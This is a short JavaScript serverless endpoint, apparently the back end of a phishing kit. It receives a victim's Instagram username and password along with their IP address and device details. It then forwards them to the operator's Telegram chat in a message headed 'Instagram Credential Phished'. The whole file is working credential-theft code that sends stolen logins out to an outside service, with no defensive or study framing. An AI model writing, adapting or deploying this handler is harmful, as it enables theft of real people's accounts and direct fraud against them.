export default async function handler(req, res) {
  // فقط POST قبول می‌کنیم
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { user, pass, ip, device, time } = req.body;

  if (!user || !pass) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID   = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('BOT_TOKEN or CHAT_ID environment variables not set');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  const message = `
🔐 *Instagram Credential Phished*
━━━━━━━━━━━━━━━━━━━━━
👤 *Username/Email:* \`${user}\`
🔑 *Password:* \`${pass}\`
🌐 *IP Address:* \`${ip || 'Unknown'}\`
📱 *Device:* \`${(device || 'Unknown').substring(0, 200)}\`
⏰ *Time:* ${time || 'Unknown'} (IRST)
━━━━━━━━━━━━━━━━━━━━━
`;

  try {
    const tgResp = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      }
    );

    const tgData = await tgResp.json();

    if (!tgData.ok) {
      console.error('Telegram API error:', tgData);
      return res.status(500).json({ error: 'Telegram send failed' });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Failed to send to Telegram:', err);
    return res.status(500).json({ error: 'Telegram send failed' });
  }
}
